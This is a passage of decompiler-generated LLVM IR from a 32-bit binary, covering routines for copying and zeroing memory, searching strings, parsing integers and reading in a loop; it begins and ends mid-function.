  %v0_8051c95 = phi i32 [ %v0_8051c9a, %dec_label_pc_8051c93.dec_label_pc_8051c93_crit_edge ], [ %v1_8051c81, %dec_label_pc_8051c8d ], [ 0, %dec_label_pc_8051ca4 ]
  %v4_8051c93 = phi i32 [ %v4_8051c93.pre, %dec_label_pc_8051c93.dec_label_pc_8051c93_crit_edge ], [ %arg2, %dec_label_pc_8051c8d ], [ %arg2, %dec_label_pc_8051ca4 ]
  %v0_8051c93 = phi i32 [ %v1_8051c98, %dec_label_pc_8051c93.dec_label_pc_8051c93_crit_edge ], [ %arg2, %dec_label_pc_8051c8d ], [ %arg2, %dec_label_pc_8051ca4 ]
  %v1_8051c93 = inttoptr i32 %v0_8051c93 to i8*
  %v2_8051c93 = load i8, i8* %v1_8051c93, align 1
  %v3_8051c93 = zext i8 %v2_8051c93 to i32
  %v5_8051c93 = and i32 %v4_8051c93, -256
  %v6_8051c93 = or i32 %v3_8051c93, %v5_8051c93
  store i32 %v6_8051c93, i32* %eax.global-to-local, align 4
  %v1_8051c95 = add i32 %v0_8051c95, -1
  store i32 %v1_8051c95, i32* %edx.global-to-local, align 4
  %v3_8051c96 = inttoptr i32 %v2_8051c96 to i8*
  store i8 %v2_8051c93, i8* %v3_8051c96, align 1
  %v0_8051c98 = load i32, i32* @ecx, align 4
  %v1_8051c98 = add i32 %v0_8051c98, 1
  store i32 %v1_8051c98, i32* @ecx, align 4
  %v0_8051c99 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051c99 = add i32 %v0_8051c99, 1
  store i32 %v1_8051c99, i32* %ebx.global-to-local, align 4
  %v0_8051c9a = load i32, i32* %edx.global-to-local, align 4
  %v10_8051c9a = icmp eq i32 %v0_8051c9a, -1
  %v1_8051c9d = icmp eq i1 %v10_8051c9a, false
  br i1 %v1_8051c9d, label %dec_label_pc_8051c93.dec_label_pc_8051c93_crit_edge, label %dec_label_pc_8051c9f.loopexit

dec_label_pc_8051c93.dec_label_pc_8051c93_crit_edge: ; preds = %dec_label_pc_8051c93
  %v4_8051c93.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051c93

dec_label_pc_8051c9f.loopexit:                    ; preds = %dec_label_pc_8051c93
  %v0_8051c9f.pre = load i32, i32* %esi.global-to-local, align 4
  %v2_8051ca1.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8051c9f

dec_label_pc_8051c9f:                             ; preds = %dec_label_pc_8051c9f.loopexit, %dec_label_pc_8051c88
  %v2_8051ca1 = phi i32 [ %v2_8051ca1.pre, %dec_label_pc_8051c9f.loopexit ], [ %v0_8051c71, %dec_label_pc_8051c88 ]
  %v0_8051c9f = phi i32 [ %v0_8051c9f.pre, %dec_label_pc_8051c9f.loopexit ], [ %v1_8051c81, %dec_label_pc_8051c88 ]
  store i32 %v0_8051c9f, i32* %eax.global-to-local, align 4
  store i32 %v2_8051ca1, i32* @ebx, align 4
  ret i32 %v0_8051c9f

dec_label_pc_8051ca4:                             ; preds = %dec_label_pc_8051c70
  store i32 %v4_8051c76, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051c93

; uselistorder directives
  uselistorder i32 %v0_8051c9f, { 1, 0 }
  uselistorder i32 %v1_8051c99, { 1, 0 }
  uselistorder i32 %v1_8051c98, { 1, 0 }
  uselistorder i32 %v1_8051c81, { 1, 0, 2, 3, 5, 4 }
  uselistorder i32 %v4_8051c76, { 2, 0, 1, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 %arg2, { 5, 0, 1, 2, 3, 6, 4, 7, 8 }
  uselistorder label %dec_label_pc_8051c93, { 0, 2, 1 }
}

define i32 @function_8051cb0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8051cb0:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8051cb1 = load i32, i32* @ebx, align 4
  store i32 %v0_8051cb1, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %esi.global-to-local, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v1_8051cbe = icmp eq i32 %arg3, 0
  br i1 %v1_8051cbe, label %dec_label_pc_8051ccf, label %dec_label_pc_8051cc2

dec_label_pc_8051cc2:                             ; preds = %dec_label_pc_8051cb0
  store i32 0, i32* %edx.global-to-local, align 4
  %v3_8051cc411 = inttoptr i32 %arg2 to i8*
  %v4_8051cc412 = load i8, i8* %v3_8051cc411, align 1
  %v6_8051cc714 = inttoptr i32 %arg1 to i8*
  store i8 %v4_8051cc412, i8* %v6_8051cc714, align 1
  %v0_8051cca15 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051cca16 = add i32 %v0_8051cca15, 1
  store i32 %v1_8051cca16, i32* %edx.global-to-local, align 4
  %v12_8051ccb17 = icmp eq i32 %v1_8051cca16, %arg3
  %v1_8051ccd18 = icmp eq i1 %v12_8051ccb17, false
  br i1 %v1_8051ccd18, label %dec_label_pc_8051cc4.dec_label_pc_8051cc4_crit_edge, label %dec_label_pc_8051ccf.loopexit

dec_label_pc_8051cc4.dec_label_pc_8051cc4_crit_edge: ; preds = %dec_label_pc_8051cc2, %dec_label_pc_8051cc4.dec_label_pc_8051cc4_crit_edge
  %v1_8051cca20 = phi i32 [ %v1_8051cca, %dec_label_pc_8051cc4.dec_label_pc_8051cc4_crit_edge ], [ %v1_8051cca16, %dec_label_pc_8051cc2 ]
  %v1_8051cc4.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_8051cc7.pre = load i32, i32* %esi.global-to-local, align 4
  %v2_8051cc4 = add i32 %v1_8051cca20, %v1_8051cc4.pre
  %v3_8051cc4 = inttoptr i32 %v2_8051cc4 to i8*
  %v4_8051cc4 = load i8, i8* %v3_8051cc4, align 1
  %v5_8051cc7 = add i32 %v1_8051cca20, %v4_8051cc7.pre
  %v6_8051cc7 = inttoptr i32 %v5_8051cc7 to i8*
  store i8 %v4_8051cc4, i8* %v6_8051cc7, align 1
  %v0_8051cca = load i32, i32* %edx.global-to-local, align 4
  %v1_8051cca = add i32 %v0_8051cca, 1
  store i32 %v1_8051cca, i32* %edx.global-to-local, align 4
  %v12_8051ccb = icmp eq i32 %v1_8051cca, %arg3
  %v1_8051ccd = icmp eq i1 %v12_8051ccb, false
  br i1 %v1_8051ccd, label %dec_label_pc_8051cc4.dec_label_pc_8051cc4_crit_edge, label %dec_label_pc_8051ccf.loopexit

dec_label_pc_8051ccf.loopexit:                    ; preds = %dec_label_pc_8051cc4.dec_label_pc_8051cc4_crit_edge, %dec_label_pc_8051cc2
  %v4_8051cc4.lcssa = phi i8 [ %v4_8051cc412, %dec_label_pc_8051cc2 ], [ %v4_8051cc4, %dec_label_pc_8051cc4.dec_label_pc_8051cc4_crit_edge ]
  %phitmp = sext i8 %v4_8051cc4.lcssa to i32
  %v2_8051ccf.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8051ccf

dec_label_pc_8051ccf:                             ; preds = %dec_label_pc_8051ccf.loopexit, %dec_label_pc_8051cb0
  %v2_8051ccf = phi i32 [ %v0_8051cb1, %dec_label_pc_8051cb0 ], [ %v2_8051ccf.pre, %dec_label_pc_8051ccf.loopexit ]
  %.1 = phi i32 [ 0, %dec_label_pc_8051cb0 ], [ %phitmp, %dec_label_pc_8051ccf.loopexit ]
  store i32 %v2_8051ccf, i32* @ebx, align 4
  ret i32 %.1

; uselistorder directives
  uselistorder i32 %v1_8051cca, { 1, 2, 0 }
  uselistorder i32 %v1_8051cca20, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 3, 4, 1, 2 }
  uselistorder i32 %arg3, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051cc4.dec_label_pc_8051cc4_crit_edge, { 1, 0 }
}

define i32 @function_8051ce0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8051ce0:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_8051ce8 = icmp eq i32 %arg2, 0
  br i1 %v1_8051ce8, label %dec_label_pc_8051ce0.dec_label_pc_8051cf9_crit_edge, label %dec_label_pc_8051cec

dec_label_pc_8051ce0.dec_label_pc_8051cf9_crit_edge: ; preds = %dec_label_pc_8051ce0
  %v0_8051cf9.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8051cf9

dec_label_pc_8051cec:                             ; preds = %dec_label_pc_8051ce0
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_8051cf05 = inttoptr i32 %arg1 to i8*
  store i8 0, i8* %v3_8051cf05, align 1
  %v0_8051cf46 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051cf47 = add i32 %v0_8051cf46, 1
  store i32 %v1_8051cf47, i32* %eax.global-to-local, align 4
  %v12_8051cf58 = icmp eq i32 %v1_8051cf47, %arg2
  %v1_8051cf79 = icmp eq i1 %v12_8051cf58, false
  br i1 %v1_8051cf79, label %dec_label_pc_8051cf0.dec_label_pc_8051cf0_crit_edge, label %dec_label_pc_8051cf9

dec_label_pc_8051cf0.dec_label_pc_8051cf0_crit_edge: ; preds = %dec_label_pc_8051cec, %dec_label_pc_8051cf0.dec_label_pc_8051cf0_crit_edge
  %v1_8051cf410 = phi i32 [ %v1_8051cf4, %dec_label_pc_8051cf0.dec_label_pc_8051cf0_crit_edge ], [ %v1_8051cf47, %dec_label_pc_8051cec ]
  %v1_8051cf0.pre = load i32, i32* %ecx.global-to-local, align 4
  %v2_8051cf0 = add i32 %v1_8051cf410, %v1_8051cf0.pre
  %v3_8051cf0 = inttoptr i32 %v2_8051cf0 to i8*
  store i8 0, i8* %v3_8051cf0, align 1
  %v0_8051cf4 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051cf4 = add i32 %v0_8051cf4, 1
  store i32 %v1_8051cf4, i32* %eax.global-to-local, align 4
  %v12_8051cf5 = icmp eq i32 %v1_8051cf4, %arg2
  %v1_8051cf7 = icmp eq i1 %v12_8051cf5, false
  br i1 %v1_8051cf7, label %dec_label_pc_8051cf0.dec_label_pc_8051cf0_crit_edge, label %dec_label_pc_8051cf9

dec_label_pc_8051cf9:                             ; preds = %dec_label_pc_8051cec, %dec_label_pc_8051cf0.dec_label_pc_8051cf0_crit_edge, %dec_label_pc_8051ce0.dec_label_pc_8051cf9_crit_edge
  %v0_8051cf9 = phi i32 [ %v0_8051cf9.pre, %dec_label_pc_8051ce0.dec_label_pc_8051cf9_crit_edge ], [ %v1_8051cf47, %dec_label_pc_8051cec ], [ %v1_8051cf4, %dec_label_pc_8051cf0.dec_label_pc_8051cf0_crit_edge ]
  ret i32 %v0_8051cf9

; uselistorder directives
  uselistorder i32 %v1_8051cf4, { 0, 2, 3, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 3, 4, 1, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051cf9, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051cf0.dec_label_pc_8051cf0_crit_edge, { 1, 0 }
}

define i32 @function_8051d00() local_unnamed_addr {
dec_label_pc_8051d00:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp10, i32* @ecx, align 4
  %v7_8051d15 = icmp sgt i32 %tmp9, %tmp10
  br i1 %v7_8051d15, label %dec_label_pc_8051d17, label %dec_label_pc_8051d20

dec_label_pc_8051d17:                             ; preds = %dec_label_pc_8051d32, %dec_label_pc_8051d00, %dec_label_pc_8051d20
  br label %dec_label_pc_8051d1a

dec_label_pc_8051d1a:                             ; preds = %dec_label_pc_8051d45, %dec_label_pc_8051d17
  %storemerge = phi i32 [ -1, %dec_label_pc_8051d17 ], [ %v0_8051d33, %dec_label_pc_8051d45 ]
  ret i32 %storemerge

dec_label_pc_8051d20:                             ; preds = %dec_label_pc_8051d00
  %tmp17 = icmp slt i32 %tmp10, 1
  br i1 %tmp17, label %dec_label_pc_8051d17, label %dec_label_pc_8051d24

dec_label_pc_8051d24:                             ; preds = %dec_label_pc_8051d20
  %v2_8051d3c = add i32 %tmp, -1
  br label %dec_label_pc_8051d38

dec_label_pc_8051d30:                             ; preds = %dec_label_pc_8051d38
  br label %dec_label_pc_8051d32

dec_label_pc_8051d32:                             ; preds = %dec_label_pc_8051d45, %dec_label_pc_8051d30
  %v2_8051d403 = phi i32 [ %v1_8051d45, %dec_label_pc_8051d45 ], [ 0, %dec_label_pc_8051d30 ]
  %v1_8051d32 = add i32 %v0_8051d32, 1
  %v1_8051d33 = add i32 %v0_8051d33, 1
  %v12_8051d34 = icmp eq i32 %tmp10, %v1_8051d32
  br i1 %v12_8051d34, label %dec_label_pc_8051d17, label %dec_label_pc_8051d38

dec_label_pc_8051d38:                             ; preds = %dec_label_pc_8051d32, %dec_label_pc_8051d24
  %v0_8051d32 = phi i32 [ %v1_8051d32, %dec_label_pc_8051d32 ], [ 0, %dec_label_pc_8051d24 ]
  %v0_8051d45 = phi i32 [ %v2_8051d403, %dec_label_pc_8051d32 ], [ 0, %dec_label_pc_8051d24 ]
  %v0_8051d33 = phi i32 [ %v1_8051d33, %dec_label_pc_8051d32 ], [ 1, %dec_label_pc_8051d24 ]
  %v3_8051d3c = add i32 %v2_8051d3c, %v0_8051d33
  %v4_8051d3c = inttoptr i32 %v3_8051d3c to i8*
  %v5_8051d3c = load i8, i8* %v4_8051d3c, align 1
  %v4_8051d40 = add i32 %v0_8051d45, %tmp8
  %v5_8051d40 = inttoptr i32 %v4_8051d40 to i8*
  %v6_8051d40 = load i8, i8* %v5_8051d40, align 1
  %v17_8051d40 = icmp eq i8 %v5_8051d3c, %v6_8051d40
  %v1_8051d43 = icmp eq i1 %v17_8051d40, false
  br i1 %v1_8051d43, label %dec_label_pc_8051d30, label %dec_label_pc_8051d45

dec_label_pc_8051d45:                             ; preds = %dec_label_pc_8051d38
  %v1_8051d45 = add i32 %v0_8051d45, 1
  %v12_8051d46 = icmp eq i32 %tmp9, %v1_8051d45
  %v1_8051d48 = icmp eq i1 %v12_8051d46, false
  br i1 %v1_8051d48, label %dec_label_pc_8051d32, label %dec_label_pc_8051d1a

; uselistorder directives
  uselistorder i32 %v0_8051d33, { 2, 0, 1 }
  uselistorder i32 %v0_8051d45, { 1, 0 }
  uselistorder i32 %v1_8051d32, { 1, 0 }
  uselistorder label %dec_label_pc_8051d17, { 0, 2, 1 }
}

define i32 @function_8051d50(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8051d50:
  %v4_8051d57 = ptrtoint i8* %arg1 to i32
  %v4_8051d60.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8051d60

dec_label_pc_8051d60:                             ; preds = %dec_label_pc_8051d74, %dec_label_pc_8051d70, %dec_label_pc_8051d60, %dec_label_pc_8051d50
  %v4_8051d60 = phi i32 [ %v4_8051d60.pre, %dec_label_pc_8051d50 ], [ %v6_8051d60, %dec_label_pc_8051d60 ], [ %v6_8051d60, %dec_label_pc_8051d70 ], [ %v6_8051d60, %dec_label_pc_8051d74 ]
  %v0_8051d62 = phi i32 [ %v4_8051d57, %dec_label_pc_8051d50 ], [ %v1_8051d62, %dec_label_pc_8051d60 ], [ %v1_8051d62, %dec_label_pc_8051d70 ], [ %v1_8051d62, %dec_label_pc_8051d74 ]
  %v1_8051d60 = inttoptr i32 %v0_8051d62 to i8*
  %v2_8051d60 = load i8, i8* %v1_8051d60, align 1
  %v3_8051d60 = zext i8 %v2_8051d60 to i32
  %v5_8051d60 = and i32 %v4_8051d60, -256
  %v6_8051d60 = or i32 %v3_8051d60, %v5_8051d60
  %v1_8051d62 = add i32 %v0_8051d62, 1
  %v7_8051d6c = icmp eq i8 %v2_8051d60, 32
  br i1 %v7_8051d6c, label %dec_label_pc_8051d60, label %dec_label_pc_8051d70

dec_label_pc_8051d70:                             ; preds = %dec_label_pc_8051d60
  %v10_8051d70 = icmp eq i8 %v2_8051d60, 9
  br i1 %v10_8051d70, label %dec_label_pc_8051d60, label %dec_label_pc_8051d74

dec_label_pc_8051d74:                             ; preds = %dec_label_pc_8051d70
  %v10_8051d74 = icmp eq i8 %v2_8051d60, 10
  br i1 %v10_8051d74, label %dec_label_pc_8051d60, label %dec_label_pc_8051d78

dec_label_pc_8051d78:                             ; preds = %dec_label_pc_8051d74
  %tmp41 = sext i32 %arg2 to i64
  %v10_8051d78 = icmp eq i8 %v2_8051d60, 45
  br i1 %v10_8051d78, label %dec_label_pc_8051e2d, label %dec_label_pc_8051d81

dec_label_pc_8051d81:                             ; preds = %dec_label_pc_8051d78
  %v10_8051d81 = icmp eq i8 %v2_8051d60, 43
  br i1 %v10_8051d81, label %dec_label_pc_8051e5d, label %dec_label_pc_8051d8a

dec_label_pc_8051d8a:                             ; preds = %dec_label_pc_8051d81, %dec_label_pc_8051e5d
  %v0_8051dd430 = phi i32 [ %v1_8051d62, %dec_label_pc_8051d81 ], [ %v1_8051e60, %dec_label_pc_8051e5d ]
  %v0_8051e0016.in = phi i8 [ %v2_8051d60, %dec_label_pc_8051d81 ], [ %v2_8051e5d, %dec_label_pc_8051e5d ]
  %v2_8051dde9 = phi i8 [ %v2_8051d60, %dec_label_pc_8051d81 ], [ %v2_8051e5d, %dec_label_pc_8051e5d ]
  br label %dec_label_pc_8051d97

dec_label_pc_8051d97:                             ; preds = %dec_label_pc_8051e2d, %dec_label_pc_8051d8a
  %v0_8051dd429 = phi i32 [ %v1_8051e35, %dec_label_pc_8051e2d ], [ %v0_8051dd430, %dec_label_pc_8051d8a ]
  %v0_8051e0015.in = phi i8 [ %v2_8051e2d, %dec_label_pc_8051e2d ], [ %v0_8051e0016.in, %dec_label_pc_8051d8a ]
  %v2_8051dde8 = phi i8 [ %v2_8051e2d, %dec_label_pc_8051e2d ], [ %v2_8051dde9, %dec_label_pc_8051d8a ]
  %v0_8051d97 = phi i64 [ 2147483648, %dec_label_pc_8051e2d ], [ 2147483647, %dec_label_pc_8051d8a ]
  %stack_var_-20.0 = phi i32 [ 1, %dec_label_pc_8051e2d ], [ 0, %dec_label_pc_8051d8a ]
  %v12_8051d9b = udiv i64 %v0_8051d97, %tmp41
  %v13_8051d9b = trunc i64 %v12_8051d9b to i32
  %v14_8051d9b = urem i64 %v0_8051d97, %tmp41
  %v15_8051d9b = trunc i64 %v14_8051d9b to i32
  br label %dec_label_pc_8051dde

dec_label_pc_8051db0:                             ; preds = %dec_label_pc_8051dde
  %v1_8051db0 = add nsw i32 %v0_8051db0, -48
  %v7_8051db7 = icmp slt i32 %v1_8051db0, %arg2
  br i1 %v7_8051db7, label %dec_label_pc_8051db9, label %dec_label_pc_8051e0a

dec_label_pc_8051db9:                             ; preds = %dec_label_pc_8051db0, %dec_label_pc_8051e00
  %v1_8051dd1 = phi i32 [ %v1_8051db0, %dec_label_pc_8051db0 ], [ %v2_8051e02, %dec_label_pc_8051e00 ]
  %v2_8051db9 = icmp slt i32 %v0_8051db9, 0
  br i1 %v2_8051db9, label %dec_label_pc_8051e28, label %dec_label_pc_8051dbd

dec_label_pc_8051dbd:                             ; preds = %dec_label_pc_8051db9
  %tmp42 = icmp ugt i32 %v0_8051dbd, %v13_8051d9b
  br i1 %tmp42, label %dec_label_pc_8051e28, label %dec_label_pc_8051dc3

dec_label_pc_8051dc3:                             ; preds = %dec_label_pc_8051dbd
  %v15_8051dbd = icmp eq i32 %v0_8051dbd, %v13_8051d9b
  br i1 %v15_8051dbd, label %dec_label_pc_8051e22, label %dec_label_pc_8051dc5

dec_label_pc_8051dc5:                             ; preds = %dec_label_pc_8051e22, %dec_label_pc_8051dc3
  %v4_8051dce = mul i32 %v1_8051dce, %arg2
  %v2_8051dd1 = add i32 %v1_8051dd1, %v4_8051dce
  br label %dec_label_pc_8051dd4

dec_label_pc_8051dd4:                             ; preds = %dec_label_pc_8051e28, %dec_label_pc_8051dc5
  %v1_8051dce26 = phi i32 [ %v1_8051dce, %dec_label_pc_8051e28 ], [ %v2_8051dd1, %dec_label_pc_8051dc5 ]
  %v0_8051e1220 = phi i32 [ %v0_8051dbd, %dec_label_pc_8051e28 ], [ %v2_8051dd1, %dec_label_pc_8051dc5 ]
  %v0_8051e0a19 = phi i32 [ -1, %dec_label_pc_8051e28 ], [ 1, %dec_label_pc_8051dc5 ]
  %v1_8051dd4 = inttoptr i32 %v0_8051dd4 to i8*
  %v2_8051dd4 = load i8, i8* %v1_8051dd4, align 1
  %v1_8051dda = add i32 %v0_8051dd4, 1
  br label %dec_label_pc_8051dde

dec_label_pc_8051dde:                             ; preds = %dec_label_pc_8051d97, %dec_label_pc_8051dd4
  %v0_8051dd4 = phi i32 [ %v0_8051dd429, %dec_label_pc_8051d97 ], [ %v1_8051dda, %dec_label_pc_8051dd4 ]
  %v1_8051dce = phi i32 [ 0, %dec_label_pc_8051d97 ], [ %v1_8051dce26, %dec_label_pc_8051dd4 ]
  %v0_8051dbd = phi i32 [ 0, %dec_label_pc_8051d97 ], [ %v0_8051e1220, %dec_label_pc_8051dd4 ]
  %v0_8051db9 = phi i32 [ 0, %dec_label_pc_8051d97 ], [ %v0_8051e0a19, %dec_label_pc_8051dd4 ]
  %v0_8051db0.in = phi i8 [ %v0_8051e0015.in, %dec_label_pc_8051d97 ], [ %v2_8051dd4, %dec_label_pc_8051dd4 ]
  %v2_8051dde = phi i8 [ %v2_8051dde8, %dec_label_pc_8051d97 ], [ %v2_8051dd4, %dec_label_pc_8051dd4 ]
  %v0_8051db0 = sext i8 %v0_8051db0.in to i32
  %v1_8051de1 = add i8 %v2_8051dde, -48
  %tmp43 = icmp ult i8 %v1_8051de1, 10
  br i1 %tmp43, label %dec_label_pc_8051db0, label %dec_label_pc_8051de8

dec_label_pc_8051de8:                             ; preds = %dec_label_pc_8051dde
  %v1_8051de8 = add i8 %v2_8051dde, -65
  store i32 55, i32* @ecx, align 4
  %tmp44 = icmp ult i8 %v1_8051de8, 26
  br i1 %tmp44, label %dec_label_pc_8051e00, label %dec_label_pc_8051df4

dec_label_pc_8051df4:                             ; preds = %dec_label_pc_8051de8
  %v1_8051df4 = add i8 %v2_8051dde, -97
  %tmp45 = icmp ult i8 %v1_8051df4, 26
  br i1 %tmp45, label %dec_label_pc_8051dfb, label %dec_label_pc_8051e0a

dec_label_pc_8051dfb:                             ; preds = %dec_label_pc_8051df4
  store i32 87, i32* @ecx, align 4
  br label %dec_label_pc_8051e00

dec_label_pc_8051e00:                             ; preds = %dec_label_pc_8051de8, %dec_label_pc_8051dfb
  %v1_8051e02 = phi i32 [ 55, %dec_label_pc_8051de8 ], [ 87, %dec_label_pc_8051dfb ]
  %v2_8051e02 = sub nsw i32 %v0_8051db0, %v1_8051e02
  %v7_8051e08 = icmp slt i32 %v2_8051e02, %arg2
  br i1 %v7_8051e08, label %dec_label_pc_8051db9, label %dec_label_pc_8051e0a

dec_label_pc_8051e0a:                             ; preds = %dec_label_pc_8051db0, %dec_label_pc_8051df4, %dec_label_pc_8051e00
  %v2_8051e0a = icmp slt i32 %v0_8051db9, 0
  br i1 %v2_8051e0a, label %dec_label_pc_8051e49, label %dec_label_pc_8051e0e

dec_label_pc_8051e0e:                             ; preds = %dec_label_pc_8051e0a
  store i32 %stack_var_-20.0, i32* @ecx, align 4
  %v1_8051e14 = icmp eq i32 %stack_var_-20.0, 0
  br i1 %v1_8051e14, label %dec_label_pc_8051e1a, label %dec_label_pc_8051e18

dec_label_pc_8051e18:                             ; preds = %dec_label_pc_8051e0e
  %v1_8051e18 = sub i32 0, %v0_8051dbd
  br label %dec_label_pc_8051e1a

dec_label_pc_8051e1a:                             ; preds = %dec_label_pc_8051e0e, %dec_label_pc_8051e18
  %v0_8051e21 = phi i32 [ %v0_8051dbd, %dec_label_pc_8051e0e ], [ %v1_8051e18, %dec_label_pc_8051e18 ]
  ret i32 %v0_8051e21

dec_label_pc_8051e22:                             ; preds = %dec_label_pc_8051dc3
  %v5_8051e22 = sub i32 %v1_8051dd1, %v15_8051d9b
  %v11_8051e22 = xor i32 %v1_8051dd1, %v15_8051d9b
  %v12_8051e22 = xor i32 %v5_8051e22, %v1_8051dd1
  %v13_8051e22 = and i32 %v12_8051e22, %v11_8051e22
  %v14_8051e22 = icmp slt i32 %v13_8051e22, 0
  %v15_8051e22 = icmp eq i32 %v5_8051e22, 0
  %v16_8051e22 = icmp slt i32 %v5_8051e22, 0
  %v3_8051e26 = icmp ne i1 %v16_8051e22, %v14_8051e22
  %v4_8051e26 = or i1 %v15_8051e22, %v3_8051e26
  br i1 %v4_8051e26, label %dec_label_pc_8051dc5, label %dec_label_pc_8051e28

dec_label_pc_8051e28:                             ; preds = %dec_label_pc_8051dbd, %dec_label_pc_8051e22, %dec_label_pc_8051db9
  br label %dec_label_pc_8051dd4

dec_label_pc_8051e2d:                             ; preds = %dec_label_pc_8051d78
  %v1_8051e2d = inttoptr i32 %v1_8051d62 to i8*
  %v2_8051e2d = load i8, i8* %v1_8051e2d, align 1
  %v1_8051e35 = add i32 %v0_8051d62, 2
  br label %dec_label_pc_8051d97

dec_label_pc_8051e49:                             ; preds = %dec_label_pc_8051e0a
  %v8_8051e49 = icmp eq i32 %stack_var_-20.0, 0
  %v2_8051e4e = zext i1 %v8_8051e49 to i32
  %v1_8051e533 = or i32 %v2_8051e4e, -2147483648
  ret i32 %v1_8051e533

dec_label_pc_8051e5d:                             ; preds = %dec_label_pc_8051d81
  %v1_8051e5d = inttoptr i32 %v1_8051d62 to i8*
  %v2_8051e5d = load i8, i8* %v1_8051e5d, align 1
  %v1_8051e60 = add i32 %v0_8051d62, 2
  br label %dec_label_pc_8051d8a

; uselistorder directives
  uselistorder i32 %v5_8051e22, { 1, 2, 0 }
  uselistorder i32 %v2_8051e02, { 1, 0 }
  uselistorder i8 %v2_8051dd4, { 1, 0 }
  uselistorder i32 %v2_8051dd1, { 1, 0 }
  uselistorder i32 %v1_8051dd1, { 0, 1, 3, 2 }
  uselistorder i32 %v13_8051d9b, { 1, 0 }
  uselistorder i32 %v1_8051d62, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v6_8051d60, { 2, 1, 0 }
  uselistorder i8 %v2_8051d60, { 3, 0, 1, 2, 4, 5, 6, 7 }
  uselistorder i32 %v0_8051d62, { 1, 0, 2, 3 }
  uselistorder i8 9, { 0, 4, 6, 5, 1, 7, 2, 3 }
  uselistorder i32 %arg2, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8051e28, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051e1a, { 1, 0 }
  uselistorder label %dec_label_pc_8051e0a, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8051e00, { 1, 0 }
  uselistorder label %dec_label_pc_8051dde, { 1, 0 }
  uselistorder label %dec_label_pc_8051db9, { 1, 0 }
  uselistorder label %dec_label_pc_8051d8a, { 1, 0 }
}

define i32 @function_8051e70(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8051e70:
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v0_8051e71 = load i32, i32* @edi, align 4
  %v0_8051e73 = load i32, i32* @ebx, align 4
  store i32 0, i32* @ebx, align 4
  store i32 %arg1, i32* %esi.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  store i32 %arg3, i32* @edi, align 4
  %v0_8051e85.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8051e85

dec_label_pc_8051e85:                             ; preds = %dec_label_pc_8051e9d.dec_label_pc_8051e85_crit_edge, %dec_label_pc_8051e70
  %v0_8051e8c = phi i32 [ %v0_8051e8c.pre, %dec_label_pc_8051e9d.dec_label_pc_8051e85_crit_edge ], [ %arg3, %dec_label_pc_8051e70 ]
  %v1_8051e86 = phi i32 [ %v1_8051e98, %dec_label_pc_8051e9d.dec_label_pc_8051e85_crit_edge ], [ 0, %dec_label_pc_8051e70 ]
  %v0_8051e86 = phi i32 [ %v1_8051e9d, %dec_label_pc_8051e9d.dec_label_pc_8051e85_crit_edge ], [ %arg1, %dec_label_pc_8051e70 ]
  %v0_8051e85 = phi i32 [ %v1_8051e95, %dec_label_pc_8051e9d.dec_label_pc_8051e85_crit_edge ], [ %v0_8051e85.pre, %dec_label_pc_8051e70 ]
  %v2_8051e86 = add i32 %v0_8051e86, %v1_8051e86
  %v4_8051e8d = inttoptr i32 %v2_8051e86 to i32*
  %v5_8051e8d = call i32 @function_805238c(i32 %v0_8051e8c, i32* %v4_8051e8d, i32 1, i32 %v0_8051e85)
  %v1_8051e95 = add i32 %v5_8051e8d, -1
  %v8_8051e95 = icmp eq i32 %v1_8051e95, 0
  %v1_8051e96 = icmp eq i1 %v8_8051e95, false
  %v0_8051ea4.pre = load i32, i32* @ebx, align 4
  br i1 %v1_8051e96, label %dec_label_pc_8051ea4, label %dec_label_pc_8051e98

dec_label_pc_8051e98:                             ; preds = %dec_label_pc_8051e85
  %v1_8051e98 = add i32 %v0_8051ea4.pre, 1
  store i32 %v1_8051e98, i32* @ebx, align 4
  %v0_8051e99 = load i32, i32* %ebp.global-to-local, align 4
  %v7_8051e9b = icmp sgt i32 %v0_8051e99, %v1_8051e98
  br i1 %v7_8051e9b, label %dec_label_pc_8051e9d, label %dec_label_pc_8051ea4

